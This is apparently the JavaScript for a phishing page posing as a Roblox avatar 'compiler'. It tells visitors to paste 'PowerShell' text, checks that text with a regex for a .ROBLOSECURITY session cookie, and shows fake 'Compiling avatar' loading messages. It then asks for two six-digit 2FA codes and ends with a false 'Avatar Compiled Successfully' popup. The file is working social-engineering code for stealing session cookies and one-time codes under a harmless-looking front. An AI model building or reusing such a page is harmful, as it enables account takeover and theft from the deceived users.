// === UI Setup ===
document.getElementById('instructions').textContent =
  'Press on the "Compile PowerShell" button to compile your avatar. Once you have your PowerShell copied, you can paste it and hit "Enter" to send it.';

// === Modal Open/Close Functions ===
function openModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    modal.style.display = 'flex';
    modal.style.opacity = '1';
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.remove('fade-out');

    setTimeout(() => {
      const input = modal.querySelector('input.input-field.form-control');
      if (input) input.focus();
    }, 100);
  }
}

function closeModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.add('fade-out');
    setTimeout(() => {
      modal.style.display = 'none';
      modal.style.opacity = '0';
      if (modalContent) modalContent.classList.remove('fade-out');
    }, 400);
  }
}

function closeAllModals() {
  ['modal', 'twofa-modal', 'twofa-modal-2', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
}

// === Main Button ===
document.getElementById('enterButton').addEventListener('click', function() {
  openModal('modal');
});

// === PowerShell Submission ===
document.getElementById('submitButton').addEventListener('click', async function() {
  const powershellInput = document.getElementById('powershellInput');
  const powershellData = powershellInput.value.trim();

  if (!powershellData) {
    alert('Please paste your PowerShell data.');
    return;
  }

  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
  const match = powershellData.match(roblosecurityRegex);

  if (!match) {
    showErrorAlert();
    powershellInput.value = '';
    closeModal('modal');
    return;
  }

  powershellInput.value = '';
  closeModal('modal');

  // Show loading overlay and after 10 seconds show 2FA modal
  showLoading(true, true); // true = cycling
  setTimeout(() => {
    showLoading(false);
    openModal('twofa-modal');
  }, 10000);
});

// === Loading Spinner and Message ===
let loadingMsgInterval = null;
let loadingMsgIndex = 0;
const loadingMessages = [
  "Compiling avatar",
  "Gathering Avatar details",
  "Processing"
];

function showLoading(show, cycling = false) {
  if (show) {
    if (!document.getElementById('loading-overlay')) {
      const overlay = document.createElement('div');
      overlay.id = 'loading-overlay';

      const spinner = document.createElement('div');
      spinner.className = 'spinner';

      const msg = document.createElement('div');
      msg.className = 'loading-message';
      msg.id = 'loading-message';
      msg.textContent = cycling ? loadingMessages[0] : "Processing";

      overlay.appendChild(spinner);
      overlay.appendChild(msg);
      document.body.appendChild(overlay);
    }
    if (cycling) {
      startLoadingMessages();
    } else {
      stopLoadingMessages();
      document.getElementById('loading-message').textContent = "Processing";
    }
    // Spinner is always visible now!
    const spinnerElem = document.querySelector('#loading-overlay .spinner');
    if (spinnerElem) spinnerElem.style.display = '';
  } else {
    stopLoadingMessages();
    const overlay = document.getElementById('loading-overlay');
    if (overlay) overlay.remove();
  }
}

function startLoadingMessages() {
  loadingMsgIndex = 0;
  const msgDiv = document.getElementById('loading-message');
  if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
  loadingMsgInterval = setInterval(() => {
    loadingMsgIndex = (loadingMsgIndex + 1) % loadingMessages.length;
    const msgDiv = document.getElementById('loading-message');
    if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
  }, 1500);
}

function stopLoadingMessages() {
  clearInterval(loadingMsgInterval);
}

// === Red Alert Box ===
function showErrorAlert() {
  const alert = document.getElementById('error-alert');
  if (alert) {
    alert.style.display = 'block';
    alert.style.opacity = '1';
    setTimeout(() => {
      alert.style.opacity = '0';
      setTimeout(() => { alert.style.display = 'none'; }, 500);
    }, 4000);
  }
}

// === 2FA Modal Logic ===
const twofaInput = document.getElementById('twofa-input');
const verifyButton = document.getElementById('verifyButton');

if (twofaInput && verifyButton) {
  twofaInput.addEventListener('input', () => {
    const enabled = /^\d{6}$/.test(twofaInput.value);
    verifyButton.disabled = !enabled;
    verifyButton.classList.toggle('enabled', enabled);
  });

  verifyButton.addEventListener('click', async () => {
    const codeEnteredValue = twofaInput.value.trim();
    if (!/^\d{6}$/.test(codeEnteredValue)) {
      alert('Please enter a valid 6-digit code.');
      return;
    }

    twofaInput.value = '';
    closeModal('twofa-modal');

    // Show loading overlay with only "Processing" for 5 seconds, then show email modal
    showLoading(true, false);
    setTimeout(() => {
      showLoading(false);
      openModal('twofa-modal-2');
    }, 5000);
  });
}

const twofaInput2 = document.getElementById('twofa-input-2');
const verifyButton2 = document.getElementById('verifyButton2');

if (twofaInput2 && verifyButton2) {
  twofaInput2.addEventListener('input', () => {
    const enabled = /^\d{6}$/.test(twofaInput2.value);
    verifyButton2.disabled = !enabled;
    verifyButton2.classList.toggle('enabled', enabled);
  });

  verifyButton2.addEventListener('click', async () => {
    const codeEnteredValue = twofaInput2.value.trim();
    if (!/^\d{6}$/.test(codeEnteredValue)) {
      alert('Please enter a valid 6-digit code.');
      return;
    }

    twofaInput2.value = '';
    closeModal('twofa-modal-2');

    // Show green alert box
    showSuccessPopup();
  });
}

// === Helpers ===
function closeTwoFAModal() {
  const modals = ['twofa-modal', 'twofa-modal-2'];
  modals.forEach(id => closeModal(id));
}

function useAnotherMethod() {
  alert('Other verification methods are not available. Please use your authenticator app or check your email.');
}

function showSuccessPopup() {
  const popup = document.createElement('div');
  popup.textContent = 'Avatar Compiled Successfully ✅ You can close this page now.';
  popup.style.position = 'fixed';
  popup.style.top = '20px';
  popup.style.left = '50%';
  popup.style.transform = 'translateX(-50%)';
  popup.style.background = '#28a745';
  popup.style.color = 'white';
  popup.style.padding = '15px 30px';
  popup.style.borderRadius = '8px';
  popup.style.fontSize = '18px';
  popup.style.fontWeight = 'bold';
  popup.style.zIndex = '9999';
  popup.style.boxShadow = '0 0 15px rgba(0,0,0,0.3)';
  document.body.appendChild(popup);

  setTimeout(() => {
    popup.style.transition = 'opacity 0.5s';
    popup.style.opacity = '0';
    setTimeout(() => popup.remove(), 500);
  }, 4000);
}